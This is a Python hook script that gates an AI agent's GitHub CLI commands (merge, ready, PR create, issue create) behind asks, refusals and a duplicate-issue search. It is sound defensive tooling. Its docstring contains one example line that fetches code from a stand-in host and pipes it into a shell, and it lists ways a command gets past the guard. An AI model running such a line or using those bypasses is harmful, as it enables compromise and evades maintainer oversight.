#!/usr/bin/env python3
"""PreToolUse guard for the tracker commands that skip a review step.

`.claude/rules/pull-requests.md` states the rules in prose: every PR
opens as a draft, every body follows the template, and a squash merge
carries a controlled subject and body. Prose reminds. This guard
enforces the mechanical half of those rules and asks about the rest,
because each of these is a shell command an agent runs without
stopping:

- `gh pr ready` with no review cycle. A ready PR triggers the automated
  review, so leaving draft is the author's call, not the agent's.
- `gh pr merge` before the automated review is read.
- `gh pr create --body`, which bypasses the template silently. The
  title becomes the squash subject and release-please parses the body
  footers, so a freeform body breaks machinery rather than style.
- `gh pr create` without `--draft`, which triggers the automated
  review before the author has looked at the diff.
- `gh issue create` with no prior search, which files one bug many
  times under different titles.

**One rule per verifiable check.** An unverifiable question fails at
any frequency: the guard cannot check whether a search ran, the
maintainer cannot check it at the prompt, and answering yes costs
nothing. So each rule routes by whether its check is mechanical.

| rule | decision | who reads it |
|------|----------|--------------|
| `gh pr merge` | `ask` | the maintainer |
| `gh pr ready` | `ask` | the maintainer |
| `gh pr create` without `--body-file` | `deny` | the agent |
| `gh pr create` without `--draft` | `deny` | the agent |
| `gh issue create` | context, no decision | the agent |

The two merge-shaped rules ask, because they are the maintainer's
decision and they fire about once per pull request. The two
`gh pr create` rules refuse, because their conditions read off the
command line. The `gh issue create` rule runs the tracker search
itself and hands the matches to the agent.

**No rule emits `allow`.** `allow` skips the interactive permission
prompt for the whole tool call, not for the matched command, so
`gh issue create -t x && curl evil | sh` would have inherited the
grant. `.claude/settings.json` ships with this repository and carries
no permissions block, so a fresh clone has no allowlist to bound it.
The `gh issue create` rule emits `additionalContext` with no decision,
which the normal permission flow still governs.

A refusal an agent cannot override costs more than a prompt when it
misfires, which is why the matching below is conservative and why
`--help` is exempt.

Field routing measured on Claude Code 2.1.233. `additionalContext`
reaches the agent with `allow` and with no decision at all. `deny`
plus `permissionDecisionReason` reaches the agent. `ask` reaches only
the maintainer, and `systemMessage` reaches nobody. Re-measure before
changing a decision value.

**What the guard does not catch, on purpose.** It reads one command
line and never a process tree. `gh api --method PUT
repos/o/r/pulls/N/merge` reaches the same endpoint. A command inside
`bash -c "..."`, `$(...)`, or backticks stays one token and does not
fire, because reaching into a quoted string is what makes a guard
refuse documentation that merely names a command. Chasing every
bypass is how a reminder becomes noise.

It fails open, but never silently. A payload the guard cannot read
allows the command and says so on stderr, so a change in the hook
payload shape leaves a trace instead of disabling every rule forever.
A failed search reports that it failed. An uncaught error in the
decision logic exits non-zero, which Claude Code reports without
blocking the tool.

Examples:
    The guard reads one PreToolUse payload on stdin and answers with a
    permission decision:

    ```console
    $ echo '{"tool_input": {"command": "gh pr merge 1"}}' \
        | python3 .claude/hooks/pr_guard.py
    {"hookSpecificOutput": {"hookEventName": "PreToolUse",
     "permissionDecision": "ask", "permissionDecisionReason": "..."}}
    ```

    An unguarded command prints nothing and exits 0:

    ```console
    $ echo '{"tool_input": {"command": "uv run pytest"}}' \
        | python3 .claude/hooks/pr_guard.py
    ```

See Also:
    - `.claude/settings.json`: Registers this guard on the Bash tool.
    - `.claude/rules/pull-requests.md`: The rules this guard enforces.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from typing import Final, NamedTuple

# Most restrictive wins when one command matches several rules,
# because the payload carries one decision.
#
# `inform` is not a Claude Code decision value. It names a rule whose
# text travels in `additionalContext`, which is an independent key. So
# an `inform` rule still reports even when a stricter rule decides.
_RANK: Final[dict[str, int]] = {"inform": 1, "ask": 2, "deny": 3}

# The tracker search runs inside a PreToolUse hook, and
# `.claude/settings.json` allows the hook 5 seconds. One search runs
# per command, whatever the segment count, so the worst case stays
# inside the budget. A hook that overruns loses its decision too.
_SEARCH_TIMEOUT_SECONDS: Final[float] = 3.0
_SEARCH_LIMIT: Final[int] = 5

# A command asking for its own documentation changes nothing, and a
# refusal would stop an agent reading the flags this guard is about.
_HELP_FLAGS: Final[frozenset[str]] = frozenset({"--help", "-h"})
_HELP_RAW: Final[re.Pattern[str]] = re.compile(r"(^|\s)(--help|-h)(\s|$)")

# Words too common to narrow a tracker search.
_STOPWORDS: Final[frozenset[str]] = frozenset(
    {
        "a", "an", "and", "are", "as", "at", "be", "but", "by", "does",
        "for", "from", "has", "have", "in", "into", "is", "it", "its",
        "no", "not", "of", "on", "or", "so", "than", "that", "the",
        "then", "to", "was", "what", "when", "which", "with", "without",
    }
)  # fmt: skip
_MIN_TERM_LEN: Final[int] = 3
_MAX_TERMS: Final[int] = 6

# Shell operators that separate one command from the next, as tokens.
# The guard reads each segment alone, so a later command never disarms
# an earlier one.
#
# A newline is absent because `shlex` reads one as whitespace and never
# emits it as a token. `split_lines` rewrites each unquoted newline to
# `;` before tokenizing, so a two-line script still yields two
# segments.
_SEPARATOR_TOKENS: Final[frozenset[str]] = frozenset({"&&", "||", ";", "|"})

# A flag spelled `--flag=false` asserts the opposite of the bare flag.
# `gh` accepts these spellings for its boolean flags, so `--draft=false`
# opens a ready PR and must not disarm the draft rule.
_FALSE_VALUES: Final[frozenset[str]] = frozenset({"false", "0", "no"})

# The same operators as raw text, plus newline, for the fallback path
# only. Tokens never carry a bare newline, but raw text does.
_SEPARATORS: Final[re.Pattern[str]] = re.compile(r"&&|\|\||;|\n|\|")

# A backslash before a newline continues one command onto the next
# line. `shlex` already handles it, so only the fallback needs this.
_CONTINUATION: Final[re.Pattern[str]] = re.compile(r"\\\s*\n")

# A heredoc introducer and its terminator. `shlex` knows nothing about
# heredocs, so it tokenizes the payload as if it were commands. A
# script that merely quotes a guarded command would be refused, so the
# payload is removed before anything reads it. bash spells the
# terminator four ways: bare, backslashed, single-quoted, and
# double-quoted, and a quoted one may carry a hyphen. `<<<` is a
# here-string and matches none of these.
_HEREDOC: Final[re.Pattern[str]] = re.compile(
    r"<<-?\s*(?:\\(?P<bare>[^\s<]+)|'(?P<sq>[^']+)'|\"(?P<dq>[^\"]+)\""
    r"|(?P<plain>[A-Za-z0-9_-]+))"
)

# What the maintainer reads when a `gh pr create` segment did not
# tokenize. A refusal here would name a flag that may be present, so
# the guard asks instead and says what it could not check.
_UNPARSED_TEXT: Final[str] = (
    "Could not verify `gh pr create` flags: the command did not tokenize "
    "(an unbalanced quote, or a heredoc the guard cannot strip), so "
    "--draft and --body-file were not checked. Confirm both are present, "
    "or move the heredoc into its own call."
)

_ISSUE_CREATE_VERB: Final[tuple[str, ...]] = ("gh", "issue", "create")


class Rule(NamedTuple):
    """One guarded command shape.

    Attributes:
        verb (tuple[str, ...]): The command words, matched as
            consecutive tokens.
        pattern (re.Pattern[str]): The same words anchored to the
            start of a segment, used only when a command cannot be
            tokenized.
        disarm (frozenset[str]): Flags that silence the rule when one
            appears as its own token in the same segment. Empty when
            nothing silences it.
        decision (str): ``ask``, ``deny``, or ``inform``. Only the
            first two name a Claude Code permission decision.
        text (str): The text the decision carries.
    """

    verb: tuple[str, ...]
    pattern: re.Pattern[str]
    disarm: frozenset[str]
    decision: str
    text: str


def rule(verb: str, disarm: tuple[str, ...], decision: str, text: str) -> Rule:
    """Build one rule from its command words.

    Args:
        verb: The command words, space separated, e.g. ``gh pr merge``.
        disarm: Flags that silence the rule, including every alias.
        decision: ``ask``, ``deny``, or ``inform``.
        text: The text the decision carries.

    Returns:
        The rule, carrying both matchers.
    """
    words = tuple(verb.split())
    escaped = r"\s+".join(re.escape(w) for w in words)
    # Anchored on purpose. The fallback runs on raw text, where an
    # unanchored search matches a mention inside prose or backticks.
    return Rule(
        words, re.compile(rf"^\s*{escaped}\b"), frozenset(disarm), decision, text
    )


_RULES: Final[tuple[Rule, ...]] = (
    rule(
        "gh pr merge",
        (),
        "ask",
        (
            "Has the automated review posted, and is every comment answered?\n"
            "Squash with --subject (the PR title), --body (only the content "
            "above the --- separator), and --delete-branch, per "
            ".claude/rules/pull-requests.md."
        ),
    ),
    rule(
        "gh pr ready",
        (),
        "ask",
        (
            "Has the review cycle run on this diff?\n"
            "A ready PR triggers the automated code review, so a PR leaves "
            "draft only when the author says so. Docs-only PRs are not "
            "exempt."
        ),
    ),
    rule(
        "gh pr create",
        ("--body-file", "-F"),
        "deny",
        (
            "Refused: `gh pr create` without `--body-file`.\n"
            "The flag bypasses .github/PULL_REQUEST_TEMPLATE.md "
            "silently. The title becomes the squash subject and "
            "release-please parses the body footers, so a freeform body "
            "breaks machinery rather than style. Write the body to a "
            "file, then pass --body-file."
        ),
    ),
    rule(
        "gh pr create",
        ("--draft", "-d"),
        "deny",
        (
            "Refused: `gh pr create` without `--draft`.\n"
            "A ready PR triggers the automated code review. PRs stay "
            "draft until the author marks them ready, per "
            ".claude/rules/pull-requests.md. Add --draft."
        ),
    ),
    rule("gh issue create", (), "inform", ""),
)


def strip_heredocs(command: str) -> str:
    """Remove every heredoc payload from a command line.

    `shlex` knows nothing about heredocs, so it reads the payload as
    commands, and a Python script quoting a guarded command would be
    refused. The introducer stays, so the command still parses.

    Args:
        command: The full command line the tool would run.

    Returns:
        The command with each heredoc body and terminator removed.
    """
    out = command
    for match in reversed(list(_HEREDOC.finditer(command))):
        terminator = next(g for g in match.groups() if g is not None)
        body_start = out.find("\n", match.end())
        if body_start == -1:
            continue
        # Line-anchored and linear. A lazy DOTALL scan re-read the rest
        # of the input from every newline when the terminator was
        # missing, and a 32 KB body then outran the hook's budget.
        closer = re.compile(rf"^\s*{re.escape(terminator)}\s*$", re.MULTILINE)
        tail = closer.search(out, body_start + 1)
        if tail is not None:
            out = out[:body_start] + out[tail.end() :]
    return out


def split_lines(command: str) -> str:
    """Rewrite each unquoted newline as a ``;`` separator.

    `shlex` treats a newline as whitespace, so two commands on two
    lines tokenized into one segment, and the second command's flags
    then disarmed the first command's rule. Splitting the raw text on
    every newline is the wrong fix: a quoted commit message carries
    newlines that name no command. This walks the quotes, so only a
    newline outside them becomes a separator. A backslash-escaped
    newline stays, because it continues one command.

    Args:
        command: The full command line, with heredoc bodies removed.

    Returns:
        The command with each unquoted newline replaced by `` ; ``.
    """
    out: list[str] = []
    quote: str | None = None
    escaped = False
    for char in command:
        if escaped:
            escaped = False
        elif char == "\\" and quote != "'":
            escaped = True
        elif quote is not None:
            if char == quote:
                quote = None
        elif char in ("'", '"'):
            quote = char
        elif char == "\n":
            out.append(" ; ")
            continue
        out.append(char)
    return "".join(out)


def tokens(segment: str) -> list[str]:
    """Split one shell segment into tokens.

    Quoting matters here. A `--body-file` inside a quoted message is
    one token's content, never a flag.

    Operators tokenize on their own, so `segments` splits a compound
    command whether or not it spaces them. `shlex.split` leaves
    ``1&&gh`` as one token, and a later guarded command then hides
    inside it.

    Args:
        segment: The full command line, heredoc bodies already
            stripped. Separators tokenize on their own.

    Returns:
        The tokens, or an empty list when the segment carries
        unbalanced quotes.
    """
    lexer = shlex.shlex(segment, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    # The class default treats `#` as a comment opener even mid-word,
    # where bash reads it as literal. `fix#42` then lost every later
    # flag and a compliant command was refused. `shlex.split` clears
    # this too.
    lexer.commenters = ""
    try:
        return list(lexer)
    except ValueError:
        return []


def segments(command: str) -> list[tuple[str, list[str]]]:
    """Split one command line into its independent commands.

    Tokenizing first is what makes this safe. A quoted argument stays
    one token however many newlines or operators it carries, so a
    commit message naming a guarded command never reads as that
    command. Splitting raw text first tears such an argument into fake
    segments, and a prose line opening with the verb then matches.

    Args:
        command: The full command line the tool would run.

    Returns:
        One ``(segment, tokens)`` pair per command. A segment the shell
        grammar cannot parse carries no tokens, which sends the caller
        to the anchored regex for that segment alone.
    """
    lined = split_lines(strip_heredocs(command))
    present = tokens(lined)
    if not present:
        # Split on raw operators and retry each piece alone, so one
        # unbalanced quote poisons only its own segment. A compliant
        # `gh pr create` after `echo don't` was refused before this.
        joined = _CONTINUATION.sub(" ", lined)
        return [(piece, tokens(piece)) for piece in _SEPARATORS.split(joined)]
    out: list[tuple[str, list[str]]] = []
    current: list[str] = []
    for token in present:
        if token in _SEPARATOR_TOKENS:
            out.append((" ".join(current), current))
            current = []
        else:
            current.append(token)
    out.append((" ".join(current), current))
    return out


def has_verb(present: list[str], verb: tuple[str, ...]) -> bool:
    """Report whether the tokens carry the verb as consecutive words.

    Token matching keeps a quoted mention from firing a rule.
    ``echo "gh pr create"`` is one token after `shlex`, so it names no
    command. A raw-text search would match it and refuse the work,
    which the `deny` decision makes expensive.

    The first word compares by base name, so an absolute or relative
    path to the tool still fires.

    Args:
        present: Tokens of one shell segment.
        verb: The command words to find.

    Returns:
        True when the tokens contain the verb in order.
    """
    span = len(verb)
    for index in range(len(present) - span + 1):
        window = present[index : index + span]
        if os.path.basename(window[0]) == verb[0] and tuple(window[1:]) == verb[1:]:
            return True
    return False


def disarmed(present: list[str], flags: frozenset[str]) -> bool:
    """Report whether a segment carries a flag that silences its rule.

    `gh` spells the body file three ways: ``--body-file b.md``,
    ``--body-file=b.md``, and ``-F b.md``. An exact-token test misses
    the ``=`` form and refuses a correctly formed command. A boolean flag has a
    fourth spelling, ``--draft=false``, which asserts the opposite and
    so must not disarm.

    Args:
        present: Tokens of one shell segment.
        flags: Every spelling that silences the rule.

    Returns:
        True when any spelling appears with a value other than false.
    """
    for token in present:
        name, has_value, value = token.partition("=")
        if name in flags and not (has_value and value.lower() in _FALSE_VALUES):
            return True
    return False


def title_of(present: list[str]) -> str | None:
    """Read the issue title from one segment's tokens.

    Args:
        present: Tokens of one shell segment.

    Returns:
        The title, or None when the segment names none.
    """
    for flag in ("--title", "-t"):
        if flag in present:
            index = present.index(flag)
            if index + 1 < len(present):
                return present[index + 1]
    for token in present:
        if token.startswith("--title="):
            return token.split("=", 1)[1]
    return None


def search_terms(title: str) -> list[str]:
    """Reduce a title to the words worth searching.

    Args:
        title: The issue title as written.

    Returns:
        Up to `_MAX_TERMS` lowercase words, longest first and
        alphabetical within a length, without stopwords. Empty when
        the title carries none.
    """
    words = re.findall(r"[A-Za-z_][A-Za-z0-9_]*", title.lower())
    keep = [w for w in words if len(w) >= _MIN_TERM_LEN and w not in _STOPWORDS]
    # The alphabetical tie-break keeps the order stable across
    # processes. Sorting a set by length alone left ties in hash order.
    return sorted(set(keep), key=lambda w: (-len(w), w))[:_MAX_TERMS]


class _SearchFailed(Exception):
    """The tracker search produced no answer.

    Carries the sentence the agent reads. A failed search must never
    read as a clean bill of health, so every cause names itself.
    """


_ROW_FIELDS: Final[frozenset[str]] = frozenset({"number", "title", "state"})


def _search(terms: list[str]) -> list[dict]:
    """Run one tracker search and return its validated rows.

    Args:
        terms: The words to search.

    Returns:
        The matching rows, each carrying every field `_describe` reads.

    Raises:
        _SearchFailed: If the search cannot run, exits non-zero, or
            returns anything other than a list of complete rows.
    """
    gh = shutil.which("gh")
    if gh is None:
        raise _SearchFailed("Tracker search skipped: gh is not on PATH.")
    try:
        completed = subprocess.run(
            [
                gh, "issue", "list", "--state", "all",
                "--search", " ".join(terms),
                "--limit", str(_SEARCH_LIMIT),
                "--json", "number,title,state",
            ],
            capture_output=True,
            encoding="utf-8",
            errors="replace",
            check=False,
            timeout=_SEARCH_TIMEOUT_SECONDS,
        )  # fmt: skip
    except subprocess.TimeoutExpired as exc:
        raise _SearchFailed(
            f"Tracker search timed out after {_SEARCH_TIMEOUT_SECONDS:g} s."
        ) from exc
    except (OSError, subprocess.SubprocessError) as exc:
        raise _SearchFailed(f"Tracker search could not start: {exc}.") from exc
    if completed.returncode != 0:
        # `gh` explains itself on stderr. Dropping that collapses every
        # gh failure into one message, and "run gh auth login" needs a
        # different answer from "the network is down".
        detail = (completed.stderr or "").strip().splitlines()
        why = detail[0] if detail else "no explanation on stderr"
        raise _SearchFailed(
            f"Tracker search failed, gh exit {completed.returncode}: {why}."
        )
    try:
        matches = json.loads(completed.stdout)
    except ValueError as exc:
        raise _SearchFailed("Tracker search returned unparseable output.") from exc
    # A truthy non-list body would crash the hook, and a falsy one
    # would read as "found nothing", which is the mislabel this rule
    # exists to prevent.
    rows = [m for m in matches] if isinstance(matches, list) else None
    if rows is None or any(
        not isinstance(m, dict) or not m.keys() >= _ROW_FIELDS for m in rows
    ):
        raise _SearchFailed("Tracker search returned an unexpected shape.")
    return rows


def _describe(matches: list[dict]) -> str:
    """Render the tracker matches for the agent.

    Args:
        matches: Validated ``gh issue list`` rows.

    Returns:
        One line per match, then what to do about them.
    """
    listed = "\n".join(
        f"  #{m['number']} [{str(m['state']).lower()}] {m['title']}" for m in matches
    )
    return (
        f"Tracker search found {len(matches)} match(es):\n{listed}\n"
        "Read them before filing. Comment on a match instead, or say in "
        "the body why this one is distinct."
    )


def duplicate_report(title: str) -> str:
    """Search the tracker and describe what it found.

    Asking whether a search had run is unverifiable, so the guard runs
    the search instead.

    Args:
        title: The issue title the command would file.

    Returns:
        Text for the agent. It names the matches, or names why the
        search produced none. Every sentence ends with what to do.
    """
    if not title:
        return "Tracker search skipped: the command names no title. Search first."
    terms = search_terms(title)
    if not terms:
        return (
            f'Tracker search skipped: no searchable words in "{title}". '
            "Search the tracker before filing."
        )
    try:
        matches = _search(terms)
    except _SearchFailed as exc:
        return f"{exc} Search before filing."
    if not matches:
        # "Filing looks new" would assert recall this search cannot
        # support. A re-worded duplicate escapes a title search.
        return (
            f"Tracker search for {terms} matched no open or closed issue. "
            "This reads title text only and misses a re-worded duplicate. "
            "Search the tracker body text before filing."
        )
    return _describe(matches)


def help_requested(segment: str, present: list[str]) -> bool:
    """Report whether a segment only asks for documentation.

    Args:
        segment: One shell command as raw text.
        present: Its tokens, or an empty list when it did not parse.

    Returns:
        True when the first flag-like token is a help flag, or when a
        help flag stands as its own word in a segment that did not
        tokenize.
    """
    if present:
        # Only the first flag counts. `--subject -h` hands `-h` to gh
        # as a value and merges for real, so a help flag anywhere in
        # the segment exempted a command that asks for no help.
        first = next((t for t in present if t.startswith("-")), None)
        return first in _HELP_FLAGS
    return _HELP_RAW.search(segment) is not None


class Verdict(NamedTuple):
    """What the guard decided about one command.

    Attributes:
        decision (str): ``ask``, ``deny``, or ``inform``.
        reasons (list[str]): Text for an ``ask`` or ``deny``.
        context (list[str]): Text for the agent, which travels
            alongside any decision.
    """

    decision: str
    reasons: list[str]
    context: list[str]


def inspect(command: str) -> Verdict | None:
    """Decide what one shell command needs before it runs.

    The tracker search runs at most once per command, after every rule
    has matched. Running it per segment could exceed the hook's budget
    on the second search, and a hook that overruns loses its decision.

    Args:
        command: The full command line the tool would run.

    Returns:
        The verdict, or None when no rule matched.
    """
    reasons: list[str] = []
    decision: str | None = None
    title: str | None = None
    searched = False
    for segment, present in segments(command):
        if help_requested(segment, present):
            continue
        for candidate in _RULES:
            # Tokens decide when the segment parses. An unparseable
            # segment yields none, and the anchored regex then catches
            # a guarded command that opens it. A prefixed one escapes,
            # which is the price of not refusing prose.
            hit = (
                has_verb(present, candidate.verb)
                if present
                else candidate.pattern.search(segment) is not None
            )
            if not hit:
                continue
            if present and candidate.disarm and disarmed(present, candidate.disarm):
                continue
            # A disarm rule with no tokens cannot read its flag. A deny
            # naming a flag that may be present sends the agent in
            # circles, so the maintainer gets an honest ask instead.
            unparsed = not present and bool(candidate.disarm)
            verdict_decision = "ask" if unparsed else candidate.decision
            text = _UNPARSED_TEXT if unparsed else candidate.text
            if decision is None or _RANK[verdict_decision] > _RANK[decision]:
                decision = verdict_decision
            if candidate.verb == _ISSUE_CREATE_VERB:
                searched = True
                title = title or title_of(present)
            elif text not in reasons:
                reasons.append(text)
    if decision is None:
        return None
    context = [duplicate_report(title or "")] if searched else []
    return Verdict(decision, reasons, context)


def main() -> int:
    """Read one PreToolUse payload from stdin and decide on it.

    Returns:
        Always 0 when the payload was read, whatever the decision. The
        decision travels in the JSON on stdout. A payload the guard
        cannot read allows the command and names the cause on stderr,
        because a silent allow is indistinguishable from a clean pass.
    """
    try:
        payload = json.load(sys.stdin)
        command = payload["tool_input"]["command"]
    except (ValueError, KeyError, TypeError, OSError) as exc:
        # `json.JSONDecodeError` and `UnicodeDecodeError` subclass
        # `ValueError`. A missing key raises `KeyError`; a payload or
        # `tool_input` that is not a mapping raises `TypeError`. A
        # broken pipe raises `OSError`. Only payload reading sits in
        # this block, so a bug in the decision logic still propagates.
        print(
            f"pr_guard: could not read tool_input.command "
            f"({type(exc).__name__}); allowing the command",
            file=sys.stderr,
        )
        return 0
    if not isinstance(command, str):
        print(
            f"pr_guard: tool_input.command is {type(command).__name__}, "
            "not str; allowing the command",
            file=sys.stderr,
        )
        return 0

    verdict = inspect(command)
    if verdict is None:
        return 0

    out: dict[str, str] = {"hookEventName": "PreToolUse"}
    # `additionalContext` is an independent key, so a search report
    # travels with an `ask` or a `deny` as readily as on its own.
    context = "\n\n".join(text for text in verdict.context if text)
    if context:
        out["additionalContext"] = context
    if verdict.decision != "inform":
        out["permissionDecision"] = verdict.decision
        if verdict.reasons:
            out["permissionDecisionReason"] = "\n\n".join(verdict.reasons)
    if len(out) == 1:
        # Nothing to say. An empty payload risks reading as a decision.
        return 0

    print(json.dumps({"hookSpecificOutput": out}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
